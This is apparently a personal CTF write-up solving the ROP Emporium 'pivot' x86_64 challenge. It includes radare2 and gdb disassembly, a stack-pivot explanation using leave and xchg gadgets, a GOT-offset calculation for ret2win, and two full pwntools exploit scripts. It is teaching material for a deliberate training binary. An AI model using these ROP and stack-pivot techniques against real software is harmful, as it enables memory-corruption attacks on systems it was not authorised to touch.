---
Title: Ropemporium x86_64 pivot
Date: 2023-06-07T20:00:00
Tags: [linux, pwn, python, ROP, x86_64, ropemporium]
Categories: [write-up]
Author: cdpointpoint
Draft: False
---

# pivot

## Introduction

With this exercice we have a limited space to put our chaine.

We have to use this space as a first stage to prepare a second stage without limits.

The first stage :

- use a reading function like gets to write the second staged rop chain a writable saget like .data
- pivote : move the stack in this new segment

Second stage : the hacking rop chaine.


## Discovery


Executing the pivot program.

``` sh
07_pivot$ ./pivot
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7f9c43bdcf10
Send a ROP chain now and it will land there
> OK
Thank you!

Now please send your stack smash
> OK2
Thank you!

Exiting
```
An address is given to us.
And two messages are asked.

### The main function

```assembly
[0x00400847]> pdf @main
            ;-- rip:
            ; DATA XREF from entry0 @ 0x40077d
┌ 170: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_10h @ rbp-0x10
│           ; var void *ptr @ rbp-0x8
│           0x00400847      55             push rbp
│           0x00400848      4889e5         mov rbp, rsp
│           0x0040084b      4883ec10       sub rsp, 0x10
│           0x0040084f      488b051a0820.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x601070:8]=0
│           0x00400856      b900000000     mov ecx, 0                  ; size_t size
│           0x0040085b      ba02000000     mov edx, 2                  ; int mode
│           0x00400860      be00000000     mov esi, 0                  ; char *buf
│           0x00400865      4889c7         mov rdi, rax                ; FILE*stream
│           0x00400868      e8d3feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x0040086d      bf580a4000     mov edi, str.pivot_by_ROP_Emporium ; 0x400a58 ; "pivot by ROP Emporium" ; const char *s
│           0x00400872      e869feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400877      bf6e0a4000     mov edi, str.x86_64_n       ; 0x400a6e ; "x86_64\n" ; const char *s
│           0x0040087c      e85ffeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400881      48c745f80000.  mov qword [ptr], 0
│           0x00400889      bf00000001     mov edi, 0x1000000          ; size_t size
│           0x0040088e      e89dfeffff     call sym.imp.malloc         ;  void *malloc(size_t size)
│           0x00400893      488945f8       mov qword [ptr], rax
│           0x00400897      48837df800     cmp qword [ptr], 0
│       ┌─< 0x0040089c      7514           jne 0x4008b2
│       │   0x0040089e      bf780a4000     mov edi, str.Failed_to_request_space_for_pivot_stack ; 0x400a78 ; "Failed to request space for pivot stack" ; const char *s
│       │   0x004008a3      e838feffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x004008a8      bf01000000     mov edi, 1
│       │   0x004008ad      e89efeffff     call sym.imp.exit
│       │   ; CODE XREF from main @ 0x40089c
│       └─> 0x004008b2      488b45f8       mov rax, qword [ptr]
│           0x004008b6      480500ffff00   add rax, 0xffff00
│           0x004008bc      488945f0       mov qword [var_10h], rax
│           0x004008c0      488b45f0       mov rax, qword [var_10h]
│           0x004008c4      4889c7         mov rdi, rax                ; int64_t arg1
│           0x004008c7      e825000000     call sym.pwnme
│           0x004008cc      48c745f00000.  mov qword [var_10h], 0
│           0x004008d4      488b45f8       mov rax, qword [ptr]
│           0x004008d8      4889c7         mov rdi, rax                ; void *ptr
│           0x004008db      e8f0fdffff     call sym.imp.free           ; void free(void *ptr)
│           0x004008e0      bfa00a4000     mov edi, str._nExiting      ; 0x400aa0 ; "\nExiting" ; const char *s
│           0x004008e5      e8f6fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004008ea      b800000000     mov eax, 0
│           0x004008ef      c9             leave
└           0x004008f0      c3             ret
```

The main function allocate for us a large memory segment
The address is stored in $rbp-8.

The pwnme function is called with the allocated address + 0xffff00 witch is the end - 256 address of the bloc.
Its a good stack pivot addresse.

The 256 octets margin is a security option for intermediate callable libc functions

```sh
┌ 183: sym.pwnme (void *arg1);
│           ; var void *buf @ rbp-0x28
│           ; var void *s @ rbp-0x20
│           ; arg void *arg1 @ rdi
│           0x004008f1      55             push rbp
│           0x004008f2      4889e5         mov rbp, rsp
│           0x004008f5      4883ec30       sub rsp, 0x30
│           0x004008f9      48897dd8       mov qword [buf], rdi        ; arg1
│           0x004008fd      488d45e0       lea rax, [s]
│           0x00400901      ba20000000     mov edx, 0x20               ; 32 ; size_t n
│           0x00400906      be00000000     mov esi, 0                  ; int c
│           0x0040090b      4889c7         mov rdi, rax                ; void *s
│           0x0040090e      e8edfdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x00400913      bfa90a4000     mov edi, str.Call_ret2win___from_libpivot ; 0x400aa9 ; "Call ret2win() from libpivot" ; const char *s
│           0x00400918      e8c3fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040091d      488b45d8       mov rax, qword [buf]
│           0x00400921      4889c6         mov rsi, rax
│           0x00400924      bfc80a4000     mov edi, str.The_Old_Gods_kindly_bestow_upon_you_a_place_to_pivot:__p_n
│           0x00400929      b800000000     mov eax, 0
│           0x0040092e      e8bdfdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00400933      bf080b4000     mov edi, str.Send_a_ROP_chain_now_and_it_will_land_there
│           0x00400938      e8a3fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040093d      bf340b4000     mov edi, 0x400b34           ; '>'
│           0x00400942      b800000000     mov eax, 0
│           0x00400947      e8a4fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040094c      488b45d8       mov rax, qword [buf]
│           0x00400950      ba00010000     mov edx, 0x100              ; 256 ; size_t nbyte
│           0x00400955      4889c6         mov rsi, rax                ; void *buf
│           0x00400958      bf00000000     mov edi, 0                  ; stdin
│           0x0040095d      e8aefdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00400962      bf370b4000     mov edi, str.Thank_you__n   ; 0x400b37 ; "Thank you!\n" ; const char *s
│           0x00400967      e874fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040096c      bf480b4000     mov edi, str.Now_please_send_your_stack_smash ;
│           0x00400971      e86afdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400976      bf340b4000     mov edi, 0x400b34           ; '>' ; const char *format
│           0x0040097b      b800000000     mov eax, 0
│           0x00400980      e86bfdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00400985      488d45e0       lea rax, [s]
│           0x00400989      ba40000000     mov edx, 0x40               ; 64 bytes : 8 words
│           0x0040098e      4889c6         mov rsi, rax                ; rbp-0x20
│           0x00400991      bf00000000     mov edi, 0                  ; int fildes
│           0x00400996      e875fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x0040099b      bf690b4000     mov edi, str.Thank_you_     ; 0x400b69 ; "Thank you!" ; const char *s
│           0x004009a0      e83bfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004009a5      90             nop
│           0x004009a6      c9             leave
└           0x004009a7      c3             ret

```
The first read can have as size of 256 bytes and is put to the address given as and stroed in $rbp-0x28.
The we can send our hacking rop chaine in the first message and it will be stored in the heap allocated bloc.

The second read as a size of 0x40 (60) and write to rbp-0x20 (rbp-32).
Then the return adresse offset is 40 and only 24 bytes lefts for the ropchaine. 


**A quick illustration** 

The stack just before the second read :

      gef➤  x/8xg $rsp
      0x7fffffffe190:	0x0000000000000000	0x00007ffff7bd8f10
                                             allocated bloc
      0x7fffffffe1a0:	0x0000000000000000	0x0000000000000000
      0x7fffffffe1b0:	0x0000000000000000	0x0000000000000000
      0x7fffffffe1c0:	0x00007fffffffe1e0	0x00000000004008cc
                        SRBP                SRIP


After the read of "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDD" (0x20 octets)

      gef➤  x/8xg $rsp
      0x7fffffffe190:	0x0000000000000000	0x00007ffff7bd8f10
      0x7fffffffe1a0:	0x4141414141414141	0x4242424242424242
      0x7fffffffe1b0:	0x4343434343434343	0x4444444444444444
      0x7fffffffe1c0:	0x00007fffffffe10a	0x00000000004008cc

Warn. a bad LF alter le LSB of SRBP here.
We use 5 words before overflow, only 3 lefts.

## Building the attack

### Stage 1 : pivot the stack

With this 3 word we have to pivot the stack.

Pivot the stack mean : set a new adress in rsp : pop rsp.

with r2 we find a pop rsp gadget :

      [0x00400847]> /R pop rsp
      0x00400a2d                 5c  pop rsp
      0x00400a2e               415d  pop r13
      0x00400a30               415e  pop r14
      0x00400a32               415f  pop r15
      0x00400a34                 c3  ret

But it will use 4 entries on thh stacks.

we can also use a xchg gadget

      0x004009be : xchg eax, esp ; ret

To use it we will do

      - pop eax
      - @pivot
      - xchg eax, esp ; ret

|address   | comment |
|----------|--------------|
|0x04009bb | pop rax ; ret |
|leak | pivot stack adresse|
|0x004009be | xchg eax, esp ; ret |

This chaine take the 3 avalable slots. Il will work.

An other way is to use the frequently present leave instruction.
leave do :
- mov rsp, rbp
- pop rbp
We've just overwritten the value of srbp with content we control.
An and the leave of pwnme put this value in rbp.

we can set :


      gef➤  x/8xg $rsp
      0x7fffffffe190:	0x0000000000000000	0x00007ffff7bd8f10
      0x7fffffffe1a0:	0x4141414141414141	0x4242424242424242
      0x7fffffffe1b0:	0x4343434343434343	0x4444444444444444
      0x7fffffffe1c0:	[pivot address-8 ]	[leave gadget    ]
                     []


Note the - 8 on pivot address because of the "pop rbp" (by leave)

At the end of the overflow string we add : "leeked pivot stack adresse" - 8

And the ROP chain is simple *ret2win*

|address   | comment |
|----------|--------------|
|0x004009a6 | leave |



### Stage 2 : exploitation rop chain

   The goal is to call a ret2win function.

   There is no symbol ret2win in the executable :

   #rabin2 -s pivot|grep ret2win
   

There is one in libpivot.so

      07_pivot# rabin2 -s libpivot.so|grep ret2win
      18  0x00000a81 0x00000a81 GLOBAL FUNC   146      ret2win


But not directly imported by pivot.

      07_pivot# rabin2 -i pivot
      [Imports]
      nth vaddr      bind   type   lib name
      ―――――――――――――――――――――――――――――――――――――
      1   0x004006d0 GLOBAL FUNC       free
      2   0x004006e0 GLOBAL FUNC       puts
      3   0x004006f0 GLOBAL FUNC       printf
      4   0x00400700 GLOBAL FUNC       memset
      5   0x00400710 GLOBAL FUNC       read
      6   0x00000000 GLOBAL FUNC       __libc_start_main
      7   0x00000000 WEAK   NOTYPE     __gmon_start__
      8   0x00400720 GLOBAL FUNC       foothold_function
      9   0x00400730 GLOBAL FUNC       malloc
      10  0x00400740 GLOBAL FUNC       setvbuf
      11  0x00400750 GLOBAL FUNC       exit

In pivot we can find a uselessFunction

```sh
gef➤  disas uselessFunction
Dump of assembler code for function uselessFunction:
   0x00000000004009a8 <+0>:	push   rbp
   0x00000000004009a9 <+1>:	mov    rbp,rsp
   0x00000000004009ac <+4>:	call   0x400720 <foothold_function@plt>
   0x00000000004009b1 <+9>:	mov    edi,0x1
   0x00000000004009b6 <+14>:	call   0x400750 <exit@plt>
End of assembler dump.
```

witch call : foothold_function in the library.

```sh
gef➤  disas foothold_function
Dump of assembler code for function foothold_function:
   0x00007f1efcb3d96a <+0>:	push   rbp
   0x00007f1efcb3d96b <+1>:	mov    rbp,rsp
   0x00007f1efcb3d96e <+4>:	lea    rdi,[rip+0x1ab]        # 0x7f1efcb3db20
   0x00007f1efcb3d975 <+11>:	call   0x7f1efcb3d830 <puts@plt>
   0x00007f1efcb3d97a <+16>:	nop
   0x00007f1efcb3d97b <+17>:	pop    rbp
   0x00007f1efcb3d97c <+18>:	ret
End of assembler dump.

gef➤  x/s 0x7fa191a00b20
0x7fa191a00b20:	"foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot"
```

foothold_function is imported by pivot and from his address we ca obtain the ret2win adress :

Win rabin2 or readelf we cat obtain des offset of the funcions in the lib.
```sh
root@zbook310152:/w/ropemporium/x64/07_pivot# rabin2 -s libpivot.so|grep FUN
10  0x0000096a 0x0000096a GLOBAL FUNC   19       foothold_function
11  0x00000b14 0x00000b14 GLOBAL FUNC   0        _fini
12  0x00000808 0x00000808 GLOBAL FUNC   0        _init
15  0x00000a67 0x00000a67 GLOBAL FUNC   26       void_function_10
17  0x0000097d 0x0000097d GLOBAL FUNC   26       void_function_01
18  0x00000a81 0x00000a81 GLOBAL FUNC   146      ret2win
foothold_function
```

ret2win address is foothold_function address + 0x117 (0xa81 - 0x96a)

Where is the address of foothold_function ?

We can fount it in the GOT table but only after a fist call.

Looking at the got at the end of ther pwnme function.

```sh
gef➤  got
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8817 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] free@GLIBC_2.2.5  →  0x4006d6
[0x601020] puts@GLIBC_2.2.5  →  0x7f64f3a96820
[0x601028] printf@GLIBC_2.2.5  →  0x7f64f3a71450
[0x601030] memset@GLIBC_2.2.5  →  0x7f64f3b72040
[0x601038] read@GLIBC_2.2.5  →  0x7f64f3b170e0
[0x601040] foothold_function  →  0x400726
[0x601048] malloc@GLIBC_2.2.5  →  0x7f64f3ab7700
[0x601050] setvbuf@GLIBC_2.2.5  →  0x7f64f3a96e30
[0x601058] exit@GLIBC_2.2.5  →  0x400756
```
The address of foothold_function has not yet been resolved.

Undesrtanding this address : 0x400726

Starting from the function wich use foothold_function to botain th plt entry :

```sh
gef➤  disas uselessFunction
Dump of assembler code for function uselessFunction:
   0x00000000004009a8 <+0>:	push   rbp
   0x00000000004009a9 <+1>:	mov    rbp,rsp
   0x00000000004009ac <+4>:	call   0x400720 <foothold_function@plt>
   0x00000000004009b1 <+9>:	mov    edi,0x1
   0x00000000004009b6 <+14>:	call   0x400750 <exit@plt>
End of assembler dump.
gef➤  x/4i 0x400720
   0x400720 <foothold_function@plt>:	jmp    QWORD PTR [rip+0x20091a]        # 0x601040 <foothold_function@got.plt>
   0x400726 <foothold_function@plt+6>:	push   0x5                  # <=== jump to the resolve function with entree 5
   0x40072b <foothold_function@plt+11>:	jmp    0x4006c0
   0x400730 <malloc@plt>:	jmp    QWORD PTR [rip+0x200912]        # 0x601048 <malloc@got.plt>
```

exit and free functions are in the same state.
puts is resolved in the libc library : 0x7f64f3a96820

we need to call one time foothold_function (0x601040) first.

The ret2win() function in the libpivot shared object isn't imported, but that doesn't mean you can't call it using ROP! You'll need to find the .got.plt entry of foothold_function() and add the offset of ret2win() to it to resolve its actual address. Notice that foothold_function() isn't called during normal program flow, you'll have to call it first to update its .got.plt entry.


#### Method 1 : call rax

With this method the steps are :
- call foothold
- read the addres from got to reg
- adjuste address to ret2win addres in reg
- call reg

Useful gadgets

- 0x04009bb : pop rax ; ret
- 0x04009c0 : mov rax, qword ptr [rax] ; ret
- 0x0400808 : pop rbp; ret
- 0x04009c4 : add rax, rbp ; ret
- 0x04006b0 : call rax

The ROP chaine :

|address   | comment |
|----------|--------------|
|0x04009bb | pop rax ; ret |
|0x601040  | foothold_function
|0x0400808 | pop rbp; ret
|    0x117 | diff with ret2win |
|0x04009c4 | add rax, rbp ; ret |
|0x04006b0 | call rax |

#### Method 2 : get a leak and recall

The steps :
- call foothold
- leak got entry with puts
- return to the begining of pwnme
- send a new first message without usage 
- send a new short exploit ropchaine with
    - calculated ret2win address

|address   | comment |
|----------|--------------|
| 0x601040 | foothold_function@plt
|  | puts@plt
|  | pop rax ; ret |


#### Method 3 : modify a got.plt entry

No write gadget found


## Exploitation

### Methode1 python script

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Version avec appel de

gs='''
b *pwnme+180
c
'''
# Offset avant ecrasement de l'adresse de RBP
offset=0x20

# Set up pwntools for the correct architecture
elf =  ELF('pivot')
context.binary=elf

useless_func=elf.symbols['uselessFunction']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']
pwnme=elf.symbols['pwnme']
g_leave = pwnme+181
g_poprax=0x04009bb
g_poprbp=0x0400808
g_addrax=0x04009c4
g_callrax=0x04006b0
g_movraxrax=0x04009c0


io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)


io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
print(leak)
leak = int(leak,16)
log.info(f"{leak=:x}")

# Message 1
# Version lecture de la GOT puis call vers ret2win
PL=p64(plt_foothold)
PL+=p64(g_poprax)
PL+=p64(got_foothold)
PL+=p64(g_movraxrax)
PL+=p64(g_poprbp)
PL+=p64(0x117)
PL+=p64(g_addrax)
PL+=p64(g_callrax)


io.sendlineafter(b"> ",PL)

# Message 2 : pivot
PL =b"A"*offset
PL+=p64(leak-8)
PL+=p64(g_leave)
io.sendlineafter(b"> ",PL)

io.interactive()
```

### Methode 2 python script

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Version avec appel de puts pour leak

gs='''
b *pwnme+180
c
'''
# Offset avant ecrasement de l'adresse de RBP
offset=0x20

# Set up pwntools for the correct architecture
elf =  ELF('pivot')
context.binary=elf

useless_func=elf.symbols['uselessFunction']
puts=elf.symbols['puts']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']
pwnme=elf.symbols['pwnme']
g_leave = pwnme+181
g_poprax=0x04009bb
g_poprbp=0x0400808
g_poprdi=0x0400a33
g_addrax=0x04009c4
g_callrax=0x04006b0
g_movraxrax=0x04009c0


io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)


io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
print(leak)
leak = int(leak,16)
log.info(f"{leak=:x}")

io.info("----- First stage ------")
# Message 1
# Version leak avec puts et reboucle
PL=p64(plt_foothold)   # Appel foothold
PL+=p64(g_poprdi)      # set got.foothold to rdi
PL+=p64(got_foothold)  #
PL+=p64(puts)          # send it
PL+=p64(pwnme)         # go back to pwnme

io.sendlineafter(b"> ",PL)

# Message 2 : pivot
PL2 =b"A"*offset
PL2+=p64(leak-8)
PL2+=p64(g_leave)
io.sendlineafter(b"> ",PL2)

# Reception du leak puts
io.recvline()
rep = io.recvline().rstrip()
rep = io.recvline().rstrip()
info(rep.hex())
leak=u64(rep+b"\x00\x00")
info(f"foothold leak={leak:x}")

io.info("----- Second stage ------")

io.sendlineafter(b"> ",b"AAAA")
PL3 =b"A"*offset
PL3+=p64(0xdeadbeef)
PL3+=p64(leak+0x117)
io.sendlineafter(b"> ",PL3)

io.interactive()
```






